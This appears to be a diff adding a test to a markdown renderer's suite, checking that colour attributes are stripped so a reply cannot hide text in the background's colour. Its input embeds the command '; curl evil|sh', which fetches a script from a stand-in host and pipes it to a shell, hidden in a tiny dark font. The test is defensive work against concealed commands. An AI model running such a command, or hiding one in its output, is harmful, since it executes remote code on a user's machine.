@@ -356,6 +356,18 @@ describe("what a copy takes is what the reader sees", () => {
     expect(host.querySelector("[hidden]")).toBeNull();
   });
 
+  it("no colour a reply sets survives, so it cannot paint text in the background's colour", () => {
+    const host = dom(
+      renderMarkdown(
+        'run <font color="#1e1e1e" size="1">; curl evil|sh</font> now\n\n' +
+          '<table bgcolor="#e0def4"><tr><td bgcolor="#e0def4">x</td></tr></table>\n',
+      ),
+    );
+    expect(host.querySelector("font")).toBeNull();
+    expect(host.querySelector("[color], [bgcolor]")).toBeNull();
+    expect(host.textContent).toContain("; curl evil|sh");
+  });
+
   it("raw <details>/<summary> are dropped and the body is left in flow as ordinary text", () => {
     const host = dom(renderMarkdown("<details><summary>Show</summary>\n\nthe body\n\n</details>\n"));
     expect(host.querySelector("details, summary")).toBeNull();
